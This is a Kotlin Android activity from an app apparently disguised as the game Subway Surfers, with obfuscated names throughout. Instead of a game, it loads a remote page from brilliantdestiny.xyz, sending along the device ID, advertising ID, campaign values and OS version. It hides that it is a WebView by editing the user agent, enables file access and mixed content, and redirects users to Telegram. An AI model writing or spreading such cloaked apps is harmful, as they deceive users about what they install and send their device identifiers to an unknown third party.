package com.kiloo.subwaysurfr

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.kiloo.subwaysurfr.GooodClass.Companion.C1111111
import com.kiloo.subwaysurfr.GooodClass.Companion.D111111
import com.kiloo.subwaysurfr.GooodClass.Companion.MAIN_IDfr5f
import com.kiloo.subwaysurfr.databinding.ActivityVeeeebVievBinding
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class VeeeebVievActivity : AppCompatActivity() {
    var dfergthyju: String? = null
    private val fgthyhtyy = 1

    var defrgthyj: ValueCallback<Array<Uri>>? = null

    lateinit var bindfrgthy: ActivityVeeeebVievBinding
    lateinit var vvfrgthju: WebView


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindfrgthy = ActivityVeeeebVievBinding.inflate(layoutInflater)
        setContentView(bindfrgthy.root)
        vvfrgthju = bindfrgthy.viewWedfrgftgt
        Snackbar.make(
            bindfrgthy.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val dfvfghcookieManager = CookieManager.getInstance()
        dfvfghcookieManager.setAcceptCookie(true)
        dfvfghcookieManager.setAcceptThirdPartyCookies(vvfrgthju, true)
        dfrgtgttwebSettings()
        val activitydfrgg: Activity = this

        vvfrgthju.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (dfrtgtttg5(url)) {

                        val frgtintent = Intent(Intent.ACTION_VIEW)
                        frgtintent.data = Uri.parse(url)
                        startActivity(frgtintent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                frtgt5t8(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activitydfrgg, description, Toast.LENGTH_SHORT).show()
            }


        }
        vvfrgthju.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                defrgthyj?.onReceiveValue(null)
                defrgthyj = filePathCallback
                var takePictureIntentferg: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntentferg!!.resolveActivity(packageManager) != null) {

                    var photoFilefrg: File? = null
                    try {
                        photoFilefrg = frggthyhdfrgttth()
                        takePictureIntentferg.putExtra("PhotoPath", dfergthyju)
                    } catch (ex: IOException) {

                    }


                    if (photoFilefrg != null) {
                        dfergthyju = "file:" + photoFilefrg.absolutePath
                        takePictureIntentferg.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFilefrg)
                        )
                    } else {
                        takePictureIntentferg = null
                    }
                }
                val fghjujjhy = Intent(Intent.ACTION_GET_CONTENT)
                fghjujjhy.addCategory(Intent.CATEGORY_OPENABLE)
                fghjujjhy.type = "image/*"
                val efergthyintentArray: Array<Intent?> =
                    takePictureIntentferg?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val frgth = Intent(Intent.ACTION_CHOOSER)
                frgth.putExtra(Intent.EXTRA_INTENT, fghjujjhy)
                frgth.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_pic_choose))
                frgth.putExtra(Intent.EXTRA_INITIAL_INTENTS, efergthyintentArray)
                startActivityForResult(
                    frgth, fgthyhtyy
                )
                return true
            }


            @Throws(IOException::class)
            private fun frggthyhdfrgttth(): File {
                var imageStorageDirdeffgt = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDirdeffgt.exists()) {
                    imageStorageDirdeffgt.mkdirs()
                }


                imageStorageDirdeffgt =
                    File(imageStorageDirdeffgt.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDirdeffgt
            }

        }

        vvfrgthju.loadUrl(getUrlfrgtgtt())
    }


    private fun pushToOneSignalfrgthyhy(string: String) {

        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val fgtyisPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $fgtyisPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val efeeeeisEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $efeeeeisEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val fvthyhyytisSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $fvthyhyytisSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }



    private fun getUrlfrgtgtt(): String {

        val frgtgtSspoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val sharPrefdfrfgtgt52 = getSharedPreferences("SP", MODE_PRIVATE)

        val cpOnedfrrtg2: String? = sharPrefdfrfgtgt52.getString(C1111111, "null")
        val dpOnedfrgt2: String? = sharPrefdfrfgtgt52.getString(D111111, "null")
        val mainidfrgt5: String? = sharPrefdfrfgtgt52.getString(MAIN_IDfr5f, null)

        val packdfrfr5 = "com.kiloo.subwaysurfr"

        val afIdfrgt55 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val onedfrgt = "sub_id_1="
        val twofrgt5 = "deviceID="
        val three656frg = "ad_id="
        val fourf5g = "sub_id_4="
        val fivedfr59 = "sub_id_5="
        val six6f5rf5r = "sub_id_6="


        val firstfr5fr6 = "http://"
        val secondf5 = "brilliantdestiny.xyz/go.php?to=2&"


        val linkornulldfrefr5 = "deeporg"
        val namingfrgtgt5 = "naming"


        val frgtttg = Build.VERSION.RELEASE

        val resultABdrfr = firstfr5fr6 + secondf5

        var afterfrr = ""
        if (cpOnedfrrtg2 != "null") {
            afterfrr =
                "$resultABdrfr$onedfrgt$cpOnedfrrtg2&$twofrgt5$afIdfrgt55&$three656frg$mainidfrgt5&$fourf5g$packdfrfr5&$fivedfr59$frgtttg&$six6f5rf5r$namingfrgtgt5"
        } else {
            afterfrr =
                "$resultABdrfr$onedfrgt$dpOnedfrgt2&$twofrgt5$afIdfrgt55&$three656frg$mainidfrgt5&$fourf5g$packdfrfr5&$fivedfr59$frgtttg&$six6f5rf5r$linkornulldfrefr5"
        }
        Log.d("lolo", "link is $afterfrr")
        pushToOneSignalfrgthyhy(afIdfrgt55.toString())
        return frgtgtSspoon.getString("SAVED_URL", afterfrr).toString()
    }

    private fun dfrgtgttwebSettings() {
        val dfrfgttwebSettings = vvfrgthju.settings
        dfrfgttwebSettings.javaScriptEnabled = true

        dfrfgttwebSettings.useWideViewPort = true

        dfrfgttwebSettings.loadWithOverviewMode = true
        dfrfgttwebSettings.allowFileAccess = true
        dfrfgttwebSettings.domStorageEnabled = true
        dfrfgttwebSettings.userAgentString = dfrfgttwebSettings.userAgentString.replace("; wv", "")

        dfrfgttwebSettings.javaScriptCanOpenWindowsAutomatically = true
        dfrfgttwebSettings.setSupportMultipleWindows(false)

        dfrfgttwebSettings.displayZoomControls = false
        dfrfgttwebSettings.builtInZoomControls = true
        dfrfgttwebSettings.setSupportZoom(true)

        dfrfgttwebSettings.pluginState = WebSettings.PluginState.ON
        dfrfgttwebSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        dfrfgttwebSettings.setAppCacheEnabled(true)

        dfrfgttwebSettings.allowContentAccess = true
    }


    private fun dfrtgtttg5(uri: String): Boolean {

        val frgtgtpm = packageManager
        try {

            frgtgtpm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != fgthyhtyy || defrgthyj == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                results = arrayOf(Uri.parse(dfergthyju))
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        defrgthyj?.onReceiveValue(results)
        defrgthyj = null
    }


    private var frgtghyhy = false


    var frgttthyhh544 = ""
    fun frtgt5t8(url: String?) {
        if (!url!!.contains("t.me")) {

            if (frgttthyhh544 == "") {
                frgttthyhh544 = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val frgtt5t9 = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val editor26dr5fr = frgtt5t9.edit()
                editor26dr5fr.putString("SAVED_URL", url)
                editor26dr5fr.apply()
            }
        }
    }

    override fun onBackPressed() {


        if (vvfrgthju.canGoBack()) {
            if (frgtghyhy) {
                vvfrgthju.stopLoading()
                vvfrgthju.loadUrl(frgttthyhh544)
            }
            this.frgtghyhy = true
            vvfrgthju.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                frgtghyhy = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }
}